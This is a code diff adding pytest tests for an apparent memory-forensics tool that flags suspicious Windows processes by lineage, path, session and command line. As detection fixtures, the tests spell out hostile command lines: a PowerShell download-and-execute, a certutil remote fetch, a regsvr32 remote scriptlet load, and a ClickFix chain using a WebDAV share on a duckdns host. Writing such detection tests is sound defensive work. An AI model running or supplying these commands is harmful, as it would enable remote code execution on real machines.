@@ -231,6 +231,390 @@ class TestSignals:
         assert total == len(analysis.ALL_SIGNALS)
 
 
+DEFAULT_CREATED = "2026-08-15 08:00:00+00:00"
+
+
+def analysed_from(processes, extra=None) -> analysis.Analysis:
+    """Build a fully analysed Analysis from compact specs.
+
+    ``processes`` holds ``(pid, ppid, name)`` or ``(pid, ppid, name, created)``.
+    ``extra`` adds raw rows for any other plugin. Building directly rather than
+    from the shared fixture keeps the golden expectations in test_rules.py
+    meaningful: they exist to catch regressions, and would stop doing so if
+    every new signal enlarged the folder they are computed from.
+    """
+    rows = {"windows.pslist.PsList": []}
+    for spec in processes:
+        pid, ppid, name = spec[:3]
+        created = spec[3] if len(spec) > 3 else DEFAULT_CREATED
+        rows["windows.pslist.PsList"].append({
+            "PID": pid, "PPID": ppid, "ImageFileName": name,
+            "Offset(V)": 0xB0000000 + pid,
+            "CreateTime": created, "ExitTime": None,
+        })
+    rows.update(extra or {})
+
+    result = analysis.Analysis()
+    analysis.build_entities(rows, result)
+    for process in result.processes:
+        analysis.compute_process_signals(process, result)
+    return result
+
+
+def signals_of(result: analysis.Analysis, pid: int) -> set:
+    (process,) = result.by_pid(pid)
+    return process.signals
+
+
+class TestProcessGraph:
+    """Windows reuses PIDs, so a PPID is a claim about the parent, not proof."""
+
+    def test_parent_and_children(self) -> None:
+        result = analysed_from([(4, 0, "System"), (388, 4, "smss.exe"),
+                                (500, 388, "csrss.exe")])
+        (smss,) = result.by_pid(388)
+
+        assert result.parent(smss).pid == 4
+        assert [c.pid for c in result.children(smss)] == [500]
+
+    def test_ancestors_are_nearest_first(self) -> None:
+        result = analysed_from([
+            (100, 0, "a.exe"), (200, 100, "b.exe"), (300, 200, "c.exe"),
+        ])
+        (leaf,) = result.by_pid(300)
+
+        assert [p.pid for p in result.ancestors(leaf)] == [200, 100]
+
+    def test_descendants_reach_the_whole_subtree(self) -> None:
+        result = analysed_from([
+            (100, 0, "a.exe"), (200, 100, "b.exe"), (300, 200, "c.exe"),
+        ])
+        (root,) = result.by_pid(100)
+
+        assert sorted(p.pid for p in result.descendants(root)) == [200, 300]
+
+    def test_a_parent_younger_than_its_child_is_rejected(self) -> None:
+        """The signature of a reused PID: the real parent exited and something
+        newer inherited the number. Treating it as the parent would attribute a
+        chain to a process that never launched anything."""
+        result = analysed_from([
+            (900, 0, "services.exe", "2026-08-15 08:00:00+00:00"),
+            (4180, 900, "powershell.exe", "2026-08-15 08:00:00+00:00"),
+            # Same PID as the parent above, created after the child.
+        ])
+        rows = {"windows.psscan.PsScan": [{
+            "PID": 900, "PPID": 0, "ImageFileName": "impostor.exe",
+            "Offset(V)": 0xDEAD, "CreateTime": "2026-08-15 09:00:00+00:00",
+            "ExitTime": None,
+        }]}
+        result = analysed_from(
+            [(900, 0, "services.exe"), (4180, 900, "powershell.exe")], rows
+        )
+        (child,) = result.by_pid(4180)
+
+        # Two candidates for PID 900 now; the younger one cannot be the parent,
+        # leaving exactly one plausible answer.
+        assert len(result.by_pid(900)) == 2
+        assert result.parent(child).name == "services.exe"
+
+    def test_an_ambiguous_parent_resolves_to_nothing(self) -> None:
+        """Two equally plausible candidates: guessing would be worse than
+        reporting nothing."""
+        rows = {"windows.psscan.PsScan": [{
+            "PID": 900, "PPID": 0, "ImageFileName": "other.exe",
+            "Offset(V)": 0xDEAD, "CreateTime": DEFAULT_CREATED, "ExitTime": None,
+        }]}
+        result = analysed_from(
+            [(900, 0, "services.exe"), (4180, 900, "powershell.exe")], rows
+        )
+        (child,) = result.by_pid(4180)
+
+        assert result.parent(child) is None
+
+    def test_a_self_parented_process_does_not_loop(self) -> None:
+        result = analysed_from([(100, 100, "weird.exe")])
+        (target,) = result.by_pid(100)
+
+        assert result.parent(target) is None
+        assert result.ancestors(target) == []
+
+    def test_a_parent_cycle_terminates(self) -> None:
+        """Reuse can produce a ring. The walk must bound itself."""
+        result = analysed_from([(100, 200, "a.exe"), (200, 100, "b.exe")])
+        (target,) = result.by_pid(100)
+
+        chain = result.ancestors(target)
+        assert len(chain) <= analysis.Analysis.MAX_ANCESTRY_DEPTH
+        assert [p.pid for p in chain] == [200]
+
+
+class TestDerivedDetails:
+    def test_sessions_keys_on_its_own_column(self) -> None:
+        """Sessions spells it 'Process ID'; every other process plugin uses
+        'PID'. Reading it wrongly yields an entity with no session at all."""
+        assert analysis.BY_PLUGIN["windows.sessions.Sessions"].key == "Process ID"
+
+    def test_session_and_user_are_lifted(self) -> None:
+        result = analysed_from(
+            [(900, 660, "svchost.exe")],
+            {"windows.sessions.Sessions": [{
+                "Process ID": 900, "Session ID": 0, "Process": "svchost.exe",
+                "User Name": "NT AUTHORITY/SYSTEM", "Session Type": "",
+                "Create Time": DEFAULT_CREATED,
+            }]},
+        )
+        (target,) = result.by_pid(900)
+
+        assert target.session_id == 0
+        assert target.user_name == "NT AUTHORITY/SYSTEM"
+
+    def test_the_image_path_comes_from_the_kernel_not_the_peb(self) -> None:
+        """PebMasquerade exists because the PEB path can be rewritten by the
+        process. Believing it here would trust the lie the plugin exposes."""
+        result = analysed_from(
+            [(6000, 4180, "lsass.exe")],
+            {"windows.malware.pebmasquerade.PebMasquerade": [{
+                "PID": 6000, "EPROCESS_ImageFileName": "lsass.exe",
+                "EPROCESS_SeAudit_ImageFileName":
+                    "\\Device\\HarddiskVolume5\\Users\\bob\\lsass.exe",
+                "PEB_ImageFilePath": "C:\\Windows\\System32\\lsass.exe",
+                "PEB_ImageFilePath_Spoofed": True,
+                "PEB_CommandLine_Spoofed": False,
+            }]},
+        )
+        (target,) = result.by_pid(6000)
+
+        assert target.image_path == "\\users\\bob\\lsass.exe"
+
+    def test_the_device_prefix_is_stripped(self) -> None:
+        assert analysis.normalise_path(
+            "\\Device\\HarddiskVolume5\\Windows\\System32\\lsass.exe"
+        ) == "\\windows\\system32\\lsass.exe"
+
+
+class TestImageAndContextSignals:
+    def _with_path(self, name, path, pid=900):
+        return analysed_from(
+            [(pid, 660, name)],
+            {"windows.malware.pebmasquerade.PebMasquerade": [{
+                "PID": pid, "EPROCESS_ImageFileName": name,
+                "EPROCESS_SeAudit_ImageFileName": path,
+                "PEB_ImageFilePath_Spoofed": False,
+                "PEB_CommandLine_Spoofed": False,
+            }]},
+        )
+
+    def test_a_system_binary_outside_system32(self) -> None:
+        result = self._with_path(
+            "svchost.exe", "\\Device\\HarddiskVolume5\\Users\\bob\\svchost.exe"
+        )
+        signals = signals_of(result, 900)
+
+        assert "system_process_wrong_path" in signals
+        assert "user_writable_image" in signals
+
+    def test_the_correct_path_does_not_fire(self) -> None:
+        result = self._with_path(
+            "svchost.exe", "\\Device\\HarddiskVolume5\\Windows\\System32\\svchost.exe"
+        )
+        assert "system_process_wrong_path" not in signals_of(result, 900)
+
+    def test_syswow64_is_legitimate_for_svchost(self) -> None:
+        result = self._with_path(
+            "svchost.exe", "\\Device\\HarddiskVolume5\\Windows\\SysWOW64\\svchost.exe"
+        )
+        assert "system_process_wrong_path" not in signals_of(result, 900)
+
+    def test_an_ordinary_application_under_a_profile_is_not_flagged(self) -> None:
+        """Applications live under a user profile constantly. Flagging them
+        would bury the system binary that matters."""
+        result = self._with_path(
+            "slack.exe", "\\Device\\HarddiskVolume5\\Users\\bob\\slack.exe", pid=7000
+        )
+        signals = signals_of(result, 7000)
+
+        assert "system_process_wrong_path" not in signals
+        assert "user_writable_image" not in signals
+
+    def _with_session(self, name, session, user="NT AUTHORITY/SYSTEM"):
+        return analysed_from(
+            [(900, 660, name)],
+            {"windows.sessions.Sessions": [{
+                "Process ID": 900, "Session ID": session, "Process": name,
+                "User Name": user, "Session Type": "", "Create Time": DEFAULT_CREATED,
+            }]},
+        )
+
+    def test_svchost_in_an_interactive_session(self) -> None:
+        assert "system_process_wrong_session" in signals_of(
+            self._with_session("svchost.exe", 2), 900
+        )
+
+    def test_svchost_in_session_zero_is_correct(self) -> None:
+        assert "system_process_wrong_session" not in signals_of(
+            self._with_session("svchost.exe", 0), 900
+        )
+
+    def test_csrss_is_exempt_from_the_session_check(self) -> None:
+        """One csrss exists per interactive session, so a non-zero session is
+        correct and flagging it would fire on every healthy host."""
+        assert "system_process_wrong_session" not in signals_of(
+            self._with_session("csrss.exe", 2), 900
+        )
+
+    def test_lsass_running_as_a_user(self) -> None:
+        result = self._with_session("lsass.exe", 0, user="CORP/jdoe")
+        assert "system_process_wrong_user" in signals_of(result, 900)
+
+    def test_lsass_as_system_is_correct(self) -> None:
+        result = self._with_session("lsass.exe", 0, user="NT AUTHORITY/SYSTEM")
+        assert "system_process_wrong_user" not in signals_of(result, 900)
+
+    def test_svchost_may_run_as_a_service_account(self) -> None:
+        result = self._with_session("svchost.exe", 0, user="NT AUTHORITY/LOCAL SERVICE")
+        assert "system_process_wrong_user" not in signals_of(result, 900)
+
+
+class TestCommandLineSignals:
+    def _with_args(self, args, name="powershell.exe"):
+        return analysed_from(
+            [(4180, 2100, name)],
+            {"windows.cmdline.CmdLine": [
+                {"PID": 4180, "Process": name, "Args": args}
+            ]},
+        )
+
+    def test_encoded_command(self) -> None:
+        payload = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAA=="
+        for flag in ("-e", "-enc", "-EncodedCommand"):
+            result = self._with_args(f"powershell.exe {flag} {payload}")
+            assert "encoded_command" in signals_of(result, 4180), flag
+
+    def test_execution_policy_is_not_an_encoded_command(self) -> None:
+        """-ExecutionPolicy shares the -e prefix. The base64 payload is what
+        separates them, and Bypass is not one."""
+        result = self._with_args("powershell.exe -ExecutionPolicy Bypass -File x.ps1")
+        assert "encoded_command" not in signals_of(result, 4180)
+
+    def test_an_ordinary_command_line_is_quiet(self) -> None:
+        result = self._with_args("C:\\Windows\\System32\\svchost.exe -k netsvcs",
+                                 name="svchost.exe")
+        signals = signals_of(result, 4180)
+
+        assert "encoded_command" not in signals
+        assert "suspicious_command_line" not in signals
+
+    @pytest.mark.parametrize("args", [
+        "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://x/y')",
+        "powershell -w hidden -c whoami",
+        "net use Z: \\\\host.example@SSL\\share",
+        "regsvr32 /s /n /u /i:Z:\\poc.sct scrobj.dll",
+        "powershell ([wmiclass]'Win32_Process').Create('calc')",
+        "certutil -urlcache -split -f http://x/y.exe",
+    ])
+    def test_known_techniques_are_matched(self, args) -> None:
+        assert "suspicious_command_line" in signals_of(self._with_args(args), 4180)
+
+    def test_the_reason_is_available_for_the_report(self) -> None:
+        """"Suspicious command line" alone tells an examiner nothing to write
+        down."""
+        result = self._with_args("net use Z: \\\\host@SSL\\d3f8")
+        (target,) = result.by_pid(4180)
+
+        reasons = analysis.command_line_reasons(target)
+        assert any("WebDAV" in r for r in reasons)
+
+
+class TestLineageSignals:
+    def test_a_proxy_parent_is_flagged(self) -> None:
+        result = analysed_from([
+            (2100, 900, "explorer.exe"),
+            (5100, 2100, "pcalua.exe"),
+            (4180, 5100, "powershell.exe"),
+        ])
+        assert "lolbin_proxy_parent" in signals_of(result, 4180)
+
+    def test_wmi_created_processes_are_named_as_such(self) -> None:
+        result = analysed_from([
+            (1000, 900, "WmiPrvSE.exe"),
+            (8340, 1000, "regsvr32.exe"),
+        ])
+        signals = signals_of(result, 8340)
+
+        assert "lolbin_proxy_parent" in signals
+        assert "wmi_spawned_process" in signals
+
+    def test_an_ordinary_parent_is_not_a_proxy(self) -> None:
+        result = analysed_from([
+            (2100, 900, "explorer.exe"), (4180, 2100, "powershell.exe"),
+        ])
+        assert "lolbin_proxy_parent" not in signals_of(result, 4180)
+
+    def test_office_ancestry_survives_an_intermediate_loader(self) -> None:
+        """The reason this is ancestry and not the immediate parent."""
+        result = analysed_from([
+            (2716, 2100, "WINWORD.EXE"),
+            (3000, 2716, "loader.exe"),
+            (4832, 3000, "powershell.exe"),
+        ])
+        assert "office_spawned_shell" in signals_of(result, 4832)
+
+    def test_a_shell_with_no_office_ancestor_is_quiet(self) -> None:
+        result = analysed_from([
+            (2100, 900, "explorer.exe"), (4832, 2100, "powershell.exe"),
+        ])
+        assert "office_spawned_shell" not in signals_of(result, 4832)
+
+    def test_browser_spawned_shell(self) -> None:
+        result = analysed_from([
+            (2200, 2100, "msedge.exe"), (4832, 2200, "cmd.exe"),
+        ])
+        assert "browser_spawned_shell" in signals_of(result, 4832)
+
+    def test_script_engine_spawning_a_signed_proxy(self) -> None:
+        result = analysed_from([
+            (2100, 900, "explorer.exe"),
+            (5200, 2100, "wscript.exe"),
+            (8340, 5200, "regsvr32.exe"),
+        ])
+        assert "script_engine_spawned_lolbin" in signals_of(result, 8340)
+
+    def test_the_clickfix_chain_is_caught_despite_two_lineage_breaks(self) -> None:
+        """The intrusion this project was built for.
+
+        explorer -> pcalua -> powershell, then WMI creates regsvr32 so its
+        parent becomes WmiPrvSE. Both breaks defeat a rule that walks ancestry
+        for a known-bad pair; the proxy-parent signal does not care, because it
+        looks at what the parent *is* rather than what it claims to descend from.
+        """
+        command = (
+            "pcalua.exe -a powershell -c \"Start-Service WebClient;"
+            "net use Z: \\\\rechapman.duckdns.org@SSL\\d3f8a142c9;"
+            "([wmiclass]'Win32_Process').Create('regsvr32 /s /n /u /i:Z:\\poc.sct "
+            "scrobj.dll',$null,$null)\""
+        )
+        result = analysed_from(
+            [
+                (2100, 900, "explorer.exe"),
+                (5100, 2100, "pcalua.exe"),
+                (21916, 5100, "powershell.exe"),
+                (1000, 900, "WmiPrvSE.exe"),
+                (8340, 1000, "regsvr32.exe"),
+            ],
+            {"windows.cmdline.CmdLine": [
+                {"PID": 21916, "Process": "powershell.exe", "Args": command}
+            ]},
+        )
+
+        shell = signals_of(result, 21916)
+        payload = signals_of(result, 8340)
+
+        assert "lolbin_proxy_parent" in shell
+        assert "suspicious_command_line" in shell
+        assert "lolbin_proxy_parent" in payload
+        assert "wmi_spawned_process" in payload
+
+
 class TestExternalAddresses:
     @pytest.mark.parametrize(
         "address", ["10.0.0.1", "192.168.1.5", "127.0.0.1", "169.254.3.1",
